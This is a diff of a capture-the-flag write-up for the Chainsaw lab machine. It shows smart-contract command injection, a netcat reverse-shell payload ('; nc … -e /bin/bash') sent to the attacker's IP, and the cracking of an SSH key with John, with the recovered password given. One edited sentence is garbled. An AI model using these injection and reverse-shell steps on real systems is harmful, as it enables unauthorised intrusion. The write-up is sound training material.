@@ -44,14 +44,14 @@ We have got three interesting files from FTP server, after a bit of researching 
 
 #### Analyzing Smart Contract
 
-WeaponizedPing.json - A compiled Solidity smart-contract in JSON format
-WeaponizedPing.sol - .sol extention means its an Ethereum smart-sontract written in Solidity
-address.txt - Possibly an address on a blockchain where the contract is been deployed.
++ WeaponizedPing.json - A compiled Solidity smart-contract in JSON format
++ WeaponizedPing.sol - .sol extention, Ethereum smart-sontract written in Solidity
++ address.txt - Address on a blockchain where the contract is been deployed.
 
 
+Lets take a look at the solidity code:
 
-**Lets take a look at the solidity code:**
-WeaponizedPing.sol
+**WeaponizedPing.sol**
 
 ```python
 pragma solidity ^0.4.24;
@@ -85,17 +85,17 @@ After some enumeration and reading about etherum blockchain i was able to determ
 
 Ganache CLI uses ethereumjs to simulate full client behavior and make developing Ethereum applications faster, easier, and safer. It also includes all popular RPC functions and features (like events) and can be run deterministically to make development a breez.
 
-To interact with the Ethereum blockchain, i will be using python library web3.py. To interact with the Smart Contract, we need:
+To interact with the Smart Contract, we need:
 
 + the address to identify the contract
-+ Application Binary Interface of the contract
++ Application Binary Interface of the contract (abi)
 
 To test this vulnerability we can use setDomain() function and set the domain to our localhost  and then call getDomain(). This will make the contract ping localhost, if ping successful we know we got remote code execution.
 
 ###### Building Python Script
-To test our theory So let’s start building a python script to interact with this contract. I will using web3 liabrary to interect with smart contract.
+To test our theory let’s start building a python script to interact with this contract. I will be using web3 liabrary to interect with smart contract.
 
-My final exploit is shown below
+My final exploit is shown below:
 
 ```python
 #!/usr/bin/env python3
@@ -113,7 +113,7 @@ contract.functions.getDomain().call()
 
 #### Initial Shell
 
-Before trying to get a remote shell lets our theory and find if we can achive RCE. Our script will send a ping request to our VPN ip through the SmartContract.
+Before trying to get a remote shell lets test our theory and find if we can achive RCE. Our script will send a ping request to our VPN IP.
 
 TCP Dump to capture ping request:
 
@@ -125,13 +125,13 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
 14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
 ```
-Yes we recived ICMP echo requests from our IP. Now that we know we can do RCE, lets replace the ping with our payload.
+Yes we recived ICMP echo requests from our IP. Now that we know RCE possible, lets replace the ping with our payload.
 
-###### Running the exploit
+Running the exploit:
 
 > python3 chainsaw.py '; nc 10.10.14.35 4444 -e /bin/bash'
 
-###### Waiting for reverse shell
+Waiting for reverse shell:
 
 ```python
 
@@ -160,7 +160,8 @@ administrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:
 administrator@chainsaw:/home$ 
 ```
 
-Interesting files in maintain folder.
+Interesting files in maintain folder:
+
 
 ```python
 
@@ -174,7 +175,9 @@ drwxr-x--- 3 administrator administrator 4096 Dec 13  2018 ..
 -rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 lara.key.pub
 -rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 wendy.key.pub
 ```
-In pub folder we can see public key of bobby.
+
+In pub folder we can see public key of bobby:
+
 
 ```python
 
@@ -210,7 +213,8 @@ if __name__ == "__main__":
                 password = getpass.getpass()
                 generate(username,password)
 ```
-This comment "distributing keys over Protonmail" is a interesting one. This script generate the RSA keys and sent it via proton mail. Lets look for these keys, we might find the keys stored in somewhere.
+
+This script generate the RSA keys and sent it via proton mail. Lets look for these keys, we might find the keys stored in somewhere.This comment "distributing keys over Protonmail" is a interesting one. T
 
 
 ###### InterPlanetary File System
@@ -244,7 +248,7 @@ lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -> /dev
 administrator@chainsaw:/home/administrator$ 
 
 ```
-Content of IPFS folder 
+Content of IPFS folder:
 
 ```python
 
@@ -262,8 +266,7 @@ drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
 -rw-r--r--  1 administrator administrator    2 Dec 13  2018 version
 administrator@chainsaw:/home/administrator/.ipfs$ 
 ```
-There are a lot of files in the folde, so to filtter out unrelated stuff i searched for files containing bobby inside ipfs folder **grep -iRl bobby** and found few IPFS blocks which contains bobby's data. 
-**In IPFS, a block refers to a single unit of data, identified by its key (hash)**
+There are a lot of files in the folder, so to filtter out unrelated stuff i searched for files containing bobby inside ipfs folder using **grep -iRl bobby** and found few IPFS blocks which contains bobby's data. **In IPFS, a block refers to a single unit of data, identified by its key (hash)**
 
 ```python
 
@@ -276,7 +279,7 @@ blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data
 blocks/SP/CIQJWFQFWYW5QEXAELBZ5WBEDCJBZ2RSPCHVGDOXQ6FM67VBWKVTSPI.data
 administrator@chainsaw:/home/administrator/.ipfs$ 
 ```
-Got few files that might contain the data. lets check.
+Got few files that might contain the data. lets check:
 
 ```python
 
@@ -317,9 +320,8 @@ YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48
 YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g
 RGVwYXJ0bWVudDxicj48L2Rpdj4=
 ```
-###### Base64 decoded 
 
-Mail body: 
+Baseg4 decoded Mail body: 
 
 ```python
 
@@ -329,7 +331,7 @@ IT Administration Department
 ```
 The mail attachment contains SSH keypair bobby.
 
-###### Base64 decoded RSA key
+Base64 decoded SSH keypair key:
 
 ```python
 
@@ -373,7 +375,7 @@ PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
 -----------------------d296272d7cb599bff2a1ddf6d6374d93--
 ```
 
-###### Cracking Password
+#### Cracking Password
 
 The file is encrypted with  triple DES with CBC mode. To decrypt the key we need to use ssh2john and convert the encrypted RSA Private Key into a hash format and feed it to JTR.
 
@@ -382,7 +384,7 @@ The file is encrypted with  triple DES with CBC mode. To decrypt the key we need
 ➜  chainsaw python ssh2john.py bobby.key.enc.b64 > bobby_hash                     
 
 ```
-After few seconds the key is cracked.
+After few seconds the key is cracked and password is **jackychain**
 
 ```python
 
@@ -401,7 +403,7 @@ Warning: Only 2 candidates left, minimum 4 needed for performance.
 Session completed
 ```
 
-###### Getting user.txt
+#### Getting user.txt
 
 Now I can connect as bobby and grab user.txt 
 ```python
@@ -415,8 +417,10 @@ bobby@chainsaw:~$ wc -l user.txt
 
 ```
 
-###### Priviledge Escalation
-During the enumeration for root i noticed few interesting files in bobbys home. In addition to user.txt, there are two folders in bobby’s homedir:
+#### Priviledge Escalation
+
+During the enumeration for root i noticed few interesting files in bobbys home. In addition to user.txt, there are two folders in bobby’s homedirectory:
+
 ```python
 
 bobby@chainsaw:~$ ls
@@ -441,7 +445,8 @@ drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 ..
 drwxrwxr-x 2 bobby bobby 4096 Jan 23  2019 ChainsawClub
 ```
 ##### ChainsawClub: Analysis
-Another smart contract, Looks like we’re going to be doing some more smart contract exploitation.
+
+Here we have got another smart contract, Looks like we’re going to be doing some more smart contract exploitation.
 
 Chainsaw SUID binary:
 
@@ -528,17 +533,18 @@ contract ChainsawClub {
 ```
 Interesting functions available in the solidity file:
 
-+ setUsername() and setPassword() 
-+ setApprove()
-+ getSupply() 
-+ transfer() 
-+ reset() 
++ **setUsername() and setPassword() 
++ **setApprove()
++ **getSupply() 
++ **transfer() 
++ **reset() 
 
-###### PrivEscalation Exploit:
+#### PrivEscalation Exploit:
 
 Just like before we’ll write a python script to interact with the contract.
 
 Ganache-cli running locally on port 63991 
+
 ```python
 
 bobby@chainsaw:~/projects/ChainsawClub$ netstat -ntlp
@@ -564,10 +570,12 @@ So we need to portforward,that way we can access it locally.
 Enter passphrase for key 'bobby.key.enc.b64': 
 bobby@chainsaw:~$ 
 ```
+#### Exploitation
+
 To make our exploit work we need to meet certain conditions:
 
-+  Set a new username and password.
-+  Match the credentials from the smart contract
++ Set a new username and password.
++ Match the credentials from the smart contract
 + Approve our user 
 + Transfer enough  funds to join  the club 
 
@@ -602,7 +610,7 @@ Look like we have to dig deeper to find the root.tx file. After hours of enumera
 
 ##### Slack Space
 
-Based on the hint i found a bmap folder in sbin directory.
+Based on the hint i found a **bmap** folder in **/sbin** directory.
 > bmap is a tool for creating the block map for a file or copying files using the block map,
 
 root@chainsaw:~# bmap --slack root.txt
